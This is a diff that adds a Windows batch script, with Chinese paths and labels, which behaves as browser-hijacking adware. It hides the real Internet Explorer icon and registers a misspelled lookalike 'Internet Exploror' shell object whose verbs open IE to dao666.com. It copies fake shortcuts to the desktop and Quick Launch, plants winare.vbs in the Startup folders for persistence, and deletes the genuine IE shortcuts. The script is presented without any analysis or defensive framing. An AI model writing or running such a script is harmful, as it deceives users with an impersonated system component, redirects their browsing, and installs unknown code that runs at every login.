@@ -1,0 +1,33 @@
+REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoInternetIcon" /t REG_DWORD /d 1 /f
+REG ADD "HKEY_CLASSES_ROOT\CLSID\{e17d4fc0-5564-11d1-83f2-00a0c90dc849}"
+REG ADD "HKEY_CLASSES_ROOT\CLSID\{e17d4fc0-5564-11d1-83f2-00a0c90dc849}" /v "InfoTip" /t REG_SZ /d "查找并显示 Internet 上的信息和网站" /f
+REG ADD "HKEY_CLASSES_ROOT\CLSID\{e17d4fc0-5564-11d1-83f2-00a0c90dc849}" /v "LocalizedString" /t REG_SZ /d "Internet Exploror" /f
+REG ADD "HKEY_CLASSES_ROOT\CLSID\{e17d4fc0-5564-11d1-83f2-00a0c90dc849}\DefaultIcon" 
+REG ADD "HKEY_CLASSES_ROOT\CLSID\{e17d4fc0-5564-11d1-83f2-00a0c90dc849}\DefaultIcon" /ve /t REG_EXPAND_SZ /d "shdoclc.dll,0" /f
+REG ADD "HKEY_CLASSES_ROOT\CLSID\{e17d4fc0-5564-11d1-83f2-00a0c90dc849}\InProcServer32" 
+REG ADD "HKEY_CLASSES_ROOT\CLSID\{e17d4fc0-5564-11d1-83f2-00a0c90dc849}\InProcServer32" /ve /t REG_SZ /d "%%systemRoot%%\system32\shdocvw.dll" /f
+REG ADD "HKEY_CLASSES_ROOT\CLSID\{e17d4fc0-5564-11d1-83f2-00a0c90dc849}\InProcServer32"  /v "ThreadingModel" /t REG_SZ /d "Apartment" /f
+REG ADD "HKEY_CLASSES_ROOT\CLSID\{e17d4fc0-5564-11d1-83f2-00a0c90dc849}\shell" 
+REG ADD "HKEY_CLASSES_ROOT\CLSID\{e17d4fc0-5564-11d1-83f2-00a0c90dc849}\shell" /ve /t REG_SZ /d "打开主页(&H)" /f	
+REG ADD "HKEY_CLASSES_ROOT\CLSID\{e17d4fc0-5564-11d1-83f2-00a0c90dc849}\shell\打开主页(&H)" 
+REG ADD "HKEY_CLASSES_ROOT\CLSID\{e17d4fc0-5564-11d1-83f2-00a0c90dc849}\shell\打开主页(&H)" /v "MUIVerb" /t REG_SZ /d "@shdoclc.dll,-10241" /f		
+REG ADD "HKEY_CLASSES_ROOT\CLSID\{e17d4fc0-5564-11d1-83f2-00a0c90dc849}\shell\打开主页(&H)\Command" 
+REG ADD "HKEY_CLASSES_ROOT\CLSID\{e17d4fc0-5564-11d1-83f2-00a0c90dc849}\shell\打开主页(&H)\Command" /ve /t REG_SZ /d "C:\progra~1\Intern~1\iexplore.exe http://www.dao666.com/?in" /f
+REG ADD "HKEY_CLASSES_ROOT\CLSID\{e17d4fc0-5564-11d1-83f2-00a0c90dc849}\shell\属性(&R)" 	
+REG ADD "HKEY_CLASSES_ROOT\CLSID\{e17d4fc0-5564-11d1-83f2-00a0c90dc849}\shell\属性(&R)\Command" 
+REG ADD "HKEY_CLASSES_ROOT\CLSID\{e17d4fc0-5564-11d1-83f2-00a0c90dc849}\shell\属性(&R)\Command"  /ve /t REG_SZ /d "C:\progra~1\Intern~1\iexplore.exe http://www.dao666.com/?in" /f
+REG ADD "HKEY_CLASSES_ROOT\CLSID\{e17d4fc0-5564-11d1-83f2-00a0c90dc849}\ShellFolder" 
+REG ADD "HKEY_CLASSES_ROOT\CLSID\{e17d4fc0-5564-11d1-83f2-00a0c90dc849}\ShellFolder" /v "Attributes" /t REG_DWORD /d 0 /f
+REG ADD "HKEY_CLASSES_ROOT\CLSID\{e17d4fc0-5564-11d1-83f2-00a0c90dc849}\ShellFolder" /v "HideFolderVerbs" /t REG_SZ /d "" /f
+REG ADD "HKEY_CLASSES_ROOT\CLSID\{e17d4fc0-5564-11d1-83f2-00a0c90dc849}\ShellFolder" /v "HideOnDesktopPerUser" /t REG_SZ /d "" /f
+REG ADD "HKEY_CLASSES_ROOT\CLSID\{e17d4fc0-5564-11d1-83f2-00a0c90dc849}\ShellFolder" /v "WantsParsDisplayName" /t REG_SZ /d "" /f
+
+copy ".\Internet Exploror.lnk"          "%USERPROFILE%\桌面\Internet Exploror.lnk"
+copy ".\Internet Exploror.lnk"            "%USERPROFILE%\Application Data\Microsoft\Internet Explorer\Quick Launch\Internet Exploror.lnk"
+copy ".\winare.vbs"                 "%ALLUSERSPROFILE%\「开始」菜单\程序\启动\winare.vbs"
+copy ".\winare.vbs"           "%USERPROFILE%\「开始」菜单\程序\启动\winare.vbs"
+
+del  "%USERPROFILE%\Application Data\Microsoft\Internet Explorer\Quick Launch\启动*.*"
+del   "%USERPROFILE%\桌面\Internet Explorer.lnk"
+del  "%USERPROFILE%\桌面\Internet.lnk"
+del  "%USERPROFILE%\Application Data\Microsoft\Internet Explorer\Quick Launch\Internet Explorer.lnk"
